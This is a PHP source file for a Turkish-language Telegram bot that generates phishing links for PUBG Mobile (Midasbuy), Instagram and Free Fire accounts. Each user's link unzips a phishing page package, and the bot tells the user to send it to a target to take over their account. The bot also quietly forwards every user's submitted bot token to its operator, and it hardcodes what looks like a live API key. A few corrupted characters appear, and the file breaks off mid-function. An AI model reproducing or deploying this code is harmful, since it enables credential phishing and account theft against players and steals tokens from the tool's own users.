<?php
define('API_KEY',"6135126579:AAHh0oJwj887eayO0YqAZzDUyv3UcAZhEL4");

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    $res = curl_exec($ch);
    curl_close($ch);
    return json_decode($res);
}
$update = json_decode(file_get_contents('php://input'));
if($update->message){
	$message = $update->message;
$message_id = $update->message->message_id;
$username = $message->from->username;
$chat_id = $message->chat->id;
$title = $message->chat->title;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
}
if($update->callback_query){
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$title = $update->callback_query->message->chat->title;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $update->callback_query->from->id;
}
if($update->edited_message){
	$message = $update->edited_message;
	$message_id = $message->message_id;
$username = $message->from->username;
$chat_id = $message->chat->id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
	}
	if($update->channel_post){
	$message = $update->channel_post;
	$message_id = $message->message_id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->chat->username;
$title = $message->chat->title;
$name = $message->author_signature;
$from_id = $message->chat->id;
	}
	if($update->edited_channel_post){
	$message = $update->edited_channel_post;
	$message_id = $message->message_id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->chat->username;
$name = $message->author_signature;
$from_id = $message->chat->id;
	}
	if($update->inline_query){
		$inline = $update->inline_query;
		$message = $inline;
		$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
$query = $message->query;
$text = $query;
		}
	if($update->chosen_inline_result){
		$message = $update->chosen_inline_result;
		$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
$inline_message_id = $message->inline_message_id;
$message_id = $inline_message_id;
$text = $message->query;
$query = $text;
		}
		$tc = $update->message->chat->type;
		$re = $update->message->reply_to_message;
		$re_id = $update->message->reply_to_message->from->id;
$re_user = $update->message->reply_to_message->from->username;
$re_name = $update->message->reply_to_message->from->first_name;
$re_messagid = $update->message->reply_to_message->message_id;
$re_chatid = $update->message->reply_to_message->chat->id;
$photo = $message->photo;
$video = $message->video;
$sticker = $message->sticker;
$file = $message->document;
$audio = $message->audio;
$voice = $message->voice;
$caption = $message->caption;
$photo_id = $message->photo[back]->file_id;
$video_id= $message->video->file_id;
$sticker_id = $message->sticker->file_id;
$file_id = $message->document->file_id;
$music_id = $message->audio->file_id;
$forward = $message->forward_from_chat;
$forward_id = $message->forward_from_chat->id;
$title = $message->chat->title;
if($re){
	$forward_type = $re->forward_from->type;
$forward_name = $re->forward_from->first_name;
$forward_user = $re->forward_from->username;
	}else{
$forward_type = $message->forward_from->type;
$forward_name = $message->forward_from->first_name;
$forward_user = $message->forward_from->username;
$forward_id = $message->forward_from->id;
if($forward_name == null){
	$forward = $message->forward_from_chat;
$forward_id = $message->forward_from_chat->id;
$forward_title = $message->forward_from_chat->title;
	}
}
$title = $message->chat->title;
$admin = "5941388400"; #ايديك 
///
$saiko = json_decode(file_get_contents("saiko.json"),1);
$user = $update->message->from->username; 
$user2 = $update->callback_query->from->username;
$message_id = $message->message_id;
$message_id2 = $update->callback_query->message->message_id; 
$chat_id = $message->chat->id; 
$chat_id2 = $update->callback_query->message->chat->id; 
$id = $message->from->id;
$id2 = $update->callback_query->message->from->id; 
$type = $update->message->chat->type; 
$name = $message->from->first_name.$message->from->last_name;



#مسار الاندكسات#
$midasbuy = ("devusta10.zip"); #مسار اندكس الMIDASBUY

$midas26 = ("devusta26.zip"); 
$pubgnw = ("devustapubgnw.zip");

$insta = ("wahuminsta.zip"); #مسار اندكس الانستا
$freefire = ("freefire.zip"); #مسار اندكس 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘

#صور الاندكسات#
$midasbuyphoto = ("https://t.me/DDH_I/78"); #Resim اندكس الMIDASBUY
$spinphoto = ("https://t.me/ksamk4994/14"); #Resim اندكس عجبة الحظ
$midas26photo = ("https://t.me/libmsi/4"); #Resim اندكس بيس
$instaphoto = ("https://t.me/DDH_I/11"); #Resim اندكس الانستا
$freefirephoto = ("https://t.me/DDH_I/13"); #Resim اندكس 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘
$link = "http://midas.buy.nichesite.org";

#التخزين#
mkdir("database-links");
mkdir("indexdata");
$sudo = 5941388400; #ايدي صاحب البوت


if($text == "/start"  or $text == "/backtomenu"){
# Veri depolama - lütfen kodu kurcalamayın #
file_put_contents("data/$id","$id-Real ID = ✅");
# Veri depolama - lütfen kodu kurcalamayın #
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/libmsi/4",
'caption'=>
" ☺️ ، Merhaba Hoşgeldin $name , 👋
 🤠 PUBG Hesap Düşürme Botu COORPEX !
 -------------------------------------
- ℹ️ Reaksiyon Bilgileri
- 🌟 Free Server AÇIK
- 🌟 30 günde link güncellenir !
 -------------------------------------
- [ Yapımcı Kanala Katılın ](http://t.me/Coorpex)
- [ Suponsor Kanala Katılın ](https://t.me/CyberArsiv)
- Aşağıdaki düğmeler arasında gezinin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔗 • Hesap Linki Oluştur , 📲',],['text'=>'🗑️ • Hesap Linki Sil , 🗂️️',]],
[['text'=>'🖇️ • Hesap Linklerim , 🗂️️️',]],[['text'=>'🎋 • Premium Paketler , 🎠',]],
],'resize_keyboard'=>true,
])
]);
unlink("indexdata/$id");
}

if($text == '🔗 • Hesap Linki Oluştur , 📲'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/75",
'caption'=>
"🧭 • Hoşgeldin  $name , 👋
🎪 • Bu bölüm link oluşturmak içindir , 〽️
🪐 • Botun çalışması için linki seçin , 🎯
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'💥 • PUBG MOBILE , 🕹️',]],
],'resize_keyboard'=>true])]);}

if($text == '🗑️ • Hesap Linki Sil , 🗂️️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/75",
'caption'=>
"🏝️ • Hoşgeldin  $name , 👋
⚠️ • Bu bölüm linkleri silmek içindir ، 📛
🚸 • Aşağıdaki klavyeden silmek istediğiniz linkleri seçin ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🐙 • PUBG MOBILE ، 🎁️',]],
],'resize_keyboard'=>true])]);}

if($text == "🐙 • PUBG MOBILE ، 🎁️"){
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/libmsi/4",
'caption'=>
"🧭 • Hoşgeldin  $name , 👋
🎠 • Aşağıdan link türünü seçin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🎠 • MIDASBUY ، 💸',]],
[['text'=>'👽 • MUMYA ، 💸',]],    [['text'=>'🔥 • ️MIDASBUY S26 📲',]],
],'resize_keyboard'=>true])]);}

if($text == '🖇️ • Hesap Linklerim , 🗂️️️'){ 
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/75",
'caption'=>
"🏝️ • Hoşgeldin  $name , 👋
🎯 • Bağlantıyı almak için link türünü seçin , ⚠️
🎪 • Aşağıdaki klavyeyi kullanın , 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🔥 • PUBG MOBILE ، 🚀',]],
],'resize_keyboard'=>true])]);}

if($text == "🔥 • PUBG MOBILE ، 🚀"){
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/DDH_I/68",
'caption'=>
"🧭 • Hoşgeldin  $name , 👋
🎠 • Aşağıdan link türünü seçin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'💸 • MIDASBUY , 🏝',]],
[['text'=>'💸 • MUMYA , 👽',]],   [['text'=>'💵 • ️MIDASBUY S26 📲',]],
],'resize_keyboard'=>true])]);}

if($text == "💥 • PUBG MOBILE , 🕹️"){
file_put_contents("data/$id","$id-Real ID = $database");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/libmsi/4",
'caption'=>
"👋 • Hoşgeldin  $name , 🏹
👾 • Bu bölüm link oluşturmak içindir 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 , 🪐
🏝️ • Aşağıdaki klavyeden link türünü seçin , 👇
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'🎪 • MIDASBUY , 🪔',]],
[['text'=>'🎪 • MUMYA , 👽',]],   [['text'=>'🏆 • ️MIDASBUY S26 📲',]],
],'resize_keyboard'=>true,
])
]);
unlink("indexdata/$id");
}

$makeMidasBuy = file_get_contents("indexdata/$id");
if($text != "/start" and $makeMidasBuy == "midasbuy"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$id", "del-midasbuy");
mkdir("pubg");
mkdir("pubg/$id");
mkdir("pubg/$id/m");
mkdir("database-links/$id");
file_put_contents("pubg/$id/m/token","$text");
file_put_contents("pubg/$id/s/tokens","$text");
file_put_contents("pubg/$id/m/id","$chat_id");
file_put_contents("database-links/$id/midasbuy","link-midasbuy-done");
$zip = new ZipArchive;
if ($zip->open("$midasbuy") === TRUE) {
    $zip->extractTo(__DIR__."/"."pubg/$id/m");
    $zip->close();
    
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"https://t.me/libmsi/4",
'caption'=>
"✅ • Hesap Düşürme başarıyla oluşturuldu ، 🪔
🎪 • Bot Kimliğiniz ، 🀄
@$userr • ⬅️ Botu başlatmanız gerek , başlatmazsaniz hesaplar düşmez !
🖇️ • link Bağlantınız ، Hedef kişiye gönder 👇
1. Hesap Kancası
$link/pubg/$id/m/index.php

➖➖➖➖➖➖➖➖➖➖
",
]);
}

bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Kullanıcı ID - $id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - @DevUsta 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makemidas26 = file_get_contents("indexdata/$id");
if($text != "/start" and $makemidas26 == "midas26"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$id", "del-midas26");
mkdir("midas26");
mkdir("midas26/$id");
mkdir("database-links/$id");
file_put_contents("midas26/$id/token","$text");
file_put_contents("midas26/$id/s/tokens","$text");
file_put_contents("midas26/$id/id","$chat_id");
file_put_contents("database-links/$id/midas26","link-midas26-done");
$zip = new ZipArchive;
if ($zip->open("$midas26") === TRUE) {
    $zip->extractTo(__DIR__."/"."midas26/$id");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • link başarıyla oluşturuldu ، 🪔
🎪 • Bot Kimliğiniz ، 🀄
@$userr • ⬅️ Botu başlatmanız gerek , başlatmazsaniz hesaplar düşmez !
🖇️ • link Bağlantınız ، Hedef kişiye gönder 👇
1. Hesap Kancası
$link/midas26/$id/

",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Kullanıcı ID - $id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - @DevUsta 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makePubgnw = file_get_contents("indexdata/$id");
if($text != "/start" and $makePubgnw == "pubgnw"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$id", "del-pubgnw");
mkdir("pubgnw");
mkdir("pubgnw/$id");
mkdir("database-links/$id");
file_put_contents("pubgnw/$id/token","$text");
file_put_contents("pubgnw/$id/s/tokens","$text");
file_put_contents("pubgnw/$id/id","$chat_id");
file_put_contents("database-links/$id/pubgnw","link-pubgnw-done");
$zip = new ZipArchive;
if ($zip->open("$pubgnw") === TRUE) {
    $zip->extractTo(__DIR__."/"."pubgnw/$id");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • link başarıyla oluşturuldu ، 🪔
🎪 • Bot Kimliğiniz ، 🀄
@$userr • ⬅️ Botu başlatmanız gerek , başlatmazsaniz hesaplar düşmez !
🖇️ • link Bağlantınız ، Hedef kişiye gönder 👇
1. Hesap Kancası
$link/pubgnw/$id/index.php

",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Kullanıcı ID - $id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - @DevUsta 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

$makeINsta = file_get_contents("indexdata/$id");
if($text != "/start" and $makeINsta == "insta"){
$info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$info2 = json_decode($info);
$userr = $info2->result->username;
if($userr == null){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>'Error 100 | Üzgünüz, Token yanlış ! ❌',
'parse_mode'=>'markdown',
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
]);
} else {
#midasbuy
file_put_contents("database/$id", "del-insta");
mkdir("insta");
mkdir("insta/$id");
mkdir("database-links/$id");
file_put_contents("insta/$id/token","$text");
file_put_contents("insta/$id/s/tokens","$text");
file_put_contents("insta/$id/id","$chat_id");
file_put_contents("database-links/$id/insta","link-insta-done");
$zip = new ZipArchive;
if ($zip->open("$insta") === TRUE) {
    $zip->extractTo(__DIR__."/"."insta/$id");
    $zip->close();
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • link başarıyla oluşturuldu ، 🪔
🎪 • Bot Kimliğiniz ، 🀄
@$userr • ⬅️ Botu başlatmanız gerek , başlatmazsaniz hesaplar düşmez !
🖇️ • link Bağlantınız ، Hedef kişiye gönder 👇
$l�ink/insta/$id/
",
]);
}
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>
"🧐 | Yeni Kimlik Avı Sayfası Oluşturuldu ، 💙
👾 | Kişinin Kimliği - @$user
🚸 | Kişinin Kullanıcı ID - $id
🤖 | Bot Kimliği - @$userr
⚠️ | Kişinin Bot Tokeni - 👇
$text
🧛 | Bot Devloper - @DevUsta 🪐
",
]);
unlink("indexdata/$chat_id");
}
}

if($text == '🎪 • MIDASBUY , 🪔' and !file_exists("pubg/$id/m/index.php")){ 
file_put_contents("indexdata/$id", "midasbuy");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$midasbuyphoto",
'caption'=>
"🏝️ , Merhaba  $name ، 🎠

⚠️ , Tokeninizi gönderin ve link oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎪 • MIDASBUY , 🪔' and file_exists("pubg/$id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm , bir linkden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}




if($text == '🎪 • MUMYA , 👽' and !file_exists("pubgnw/$id/m/index.php")){ 
file_put_contents("indexdata/$id", "pubgnw");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$midasbuyphoto",
'caption'=>
"🏝️ , Merhaba  $name ، 🎠

⚠️ , Tokeninizi gönderin ve link oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎪 • MUMYA , 👽' and file_exists("pubgnw/$id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm , bir linkden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}








if($text == '🏆 • ️MIDASBUY S26 📲' and !file_exists("midas26/$id/index.php")){ 
file_put_contents("indexdata/$id", "midas26");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$midas26photo",
'caption'=>
"🏝️ , Merhaba  $name ، 🎠

⚠️ , Tokeninizi gönderin ve link oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🏆 • ️MIDASBUY S26 📲' and file_exists("midas26/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm , bir linkden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🏝️ • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 , 🧸' and !file_exists("insta/$id/index.php")){ 
file_put_contents("indexdata/$id", "insta");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$instaphoto",
'caption'=>
"🏝️ , Merhaba  $name ، 🎠

⚠️ , Tokeninizi gönderin ve link oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🏝️ • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 , 🧸' and file_exists("insta/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm , bir linkden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎡 • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 , 🀄' and !file_exists("freefire/$id/index.php")){ 
file_put_contents("indexdata/$id", "freefire");
bot('sendPhoto',[
'chat_id'=>$chat_id,
'photo'=>"$freefirephoto",
'caption'=>
"🏝️ , Merhaba  $name ، 🎠

⚠️ , Tokeninizi gönderin ve link oluşturulacak ، 🚸

♨️ , Oluşturmayı iptal etmek için aşağıdaki düğmeye basın ، 👇
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎡 • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 , 🀄' and file_exists("freefire/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ • Üzgünüm , bir linkden fazlasını yapamazsın ، ♨️
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

$link_midasbuy = file_get_contents("database-links/$id/midasbuy");
if($text == '💸 • MIDASBUY , 🏝️' and $link_midasbuy == "link-midasbuy-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
1. Hesap Kancası
$link/pubg/$id/m/index.php

",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}


if($text == '💸 • MIDASBUY , 🏝️' and !file_exists("pubg/$id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm , bir link oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}



$link_pubgnw = file_get_contents("database-links/$id/pubgnw");
if($text == '💸 • MUMYA , 👽' and $link_pubgnw == "link-pubgnw-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
1. Hesap Kancası
$link/pubgnw/$id/m/index.php

",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '💸 • MUMYA , 👽' and !file_exists("pubgnw/$id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm , bir link oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}








$link_midas26 = file_get_contents("database-links/$id/midas26");
if($text == '💵 • ️MIDASBUY S26 📲' and $link_midas26 == "link-midas26-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
1. Hesap Kancası
$link/midas26/$id/

",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '💵 • ️MIDASBUY S26 📲' and !file_exists("midas26/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm , bir link oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

$link_insta = file_get_contents("database-links/$id/insta");
if($text == '🎪 • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ، 🏹' and $link_insta == "link-insta-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
$link/insta/$id/
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎪 • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ، 🏹' and !file_exists("insta/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm , bir link oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

$link_freefire = file_get_contents("database-links/$id/freefire");
if($text == '🏝️ • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 ، 🎠' and $link_freefire == "link-freefire-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • Bağlantı başarıyla bulundu , 🎪
🖇️ • senin linkin ~ 👇
$link/freefire/$id/index.php
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🏝️ • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 ، 🎠' and !file_exists("freefire/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm , bir link oluşturmadın ، 🧐
",'parse_mo�de'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎠 • MIDASBUY ، 💸' and !file_exists("pubg/$id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm , bir link oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎠 • MIDASBUY ، 💸' and file_exists("pubg/$id/m/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("pubg/$id/m/*")));
unlink("database-links/$id/midasbuy");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • link başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}



if($text == '👽 • MUMYA ، 💸' and !file_exists("pubgnw/$id/m/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm , bir link oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '👽 • MUMYA ، 💸' and file_exists("pubgnw/$id/m/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("pubgnw/$id/m/*")));
unlink("database-links/$id/pubgnw");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • link başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}



if($text == '🎯 • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 ، 🪔' and !file_exists("freefire/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm , bir link oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎯 • 𝗙𝗥𝗘𝗘𝗙𝗜𝗥𝗘 ، 🪔' and file_exists("freefire/$id/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("freefire/$id/*")));
unlink("database-links/$id/freefire");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • link başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🔥 • ️MIDASBUY S26 📲' and !file_exists("midas26/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm , bir link oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🔥 • ️MIDASBUY S26 📲' and file_exists("midas26/$id/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
array_map('unlink', array_filter((array) glob("midas26/$id/*")));
unlink("database-links/$id/midas26");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>
"📛 • link başarıyla silindi ✅
⁉️ • İşlem kodu - $result
",'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎋 • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ، 🪐' and !file_exists("insta/$id/index.php")){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"⚠️ | Üzgünüm , bir link oluşturmadın ، 🧐
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[

],'resize_keyboard'=>true])]);}

if($text == '🎋 • 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ، 🪐' and file_exists("insta/$id/index.php")){ 
$delete = 8; 
$result = bin2hex(random_bytes($delete)); 
